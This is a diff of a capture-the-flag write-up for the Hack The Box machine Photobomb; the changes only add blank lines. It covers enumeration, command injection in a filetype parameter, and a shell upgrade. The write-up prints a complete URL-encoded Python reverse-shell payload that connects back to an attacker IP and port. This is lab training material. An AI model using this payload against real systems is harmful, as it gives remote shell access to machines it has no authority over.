@@ -10,6 +10,7 @@ There are only two open ports, port 22 and port 80
 2. Port 80 enumeration
 photobomb.htb
  ![image](https://user-images.githubusercontent.com/107045536/216795779-e44da4f3-ff11-4552-a2a6-064c47d74f7a.png)
+ 
 This link redirects to /printer which is asking for a username and password that we don’t know.
  ![image](https://user-images.githubusercontent.com/107045536/216795784-25623989-36b0-4b9b-8439-b98cc199a1b7.png)
 Photobomb.htb source code 
@@ -33,11 +34,13 @@ Let's test for command injection, start "python web server"
 We found that only the filetype parameter is vulnerable 
 Lets create some reverse shell: https://www.revshells.com/ 
 export+RHOST="10.10.14.34";export+RPORT=5555;python3+-c+'import+sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("sh")'
+
 Start the Netcat listener 
 ![image](https://user-images.githubusercontent.com/107045536/216795815-f88dbd93-f881-49b4-b084-f2bfacede87a.png)
 ![image](https://user-images.githubusercontent.com/107045536/216795821-274fe779-ae03-4388-a34e-74cd087113c3.png)
 
 3. Privilege Escalation
+
 Lets upgrade our shell 
 export TERM=xterm
 python3 -c 'import pty;pty.spawn("/bin/bash")'
